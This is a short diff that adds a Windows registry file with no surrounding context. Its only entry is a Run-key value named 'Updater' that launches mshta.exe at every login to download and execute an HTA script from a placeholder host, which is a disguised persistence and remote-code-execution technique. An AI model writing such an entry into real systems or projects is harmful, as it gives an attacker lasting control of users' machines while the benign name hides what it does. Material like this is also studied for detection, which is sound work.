@@ -1,0 +1,3 @@
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]
+"Updater"="mshta.exe http://example.invalid/a.hta"
+
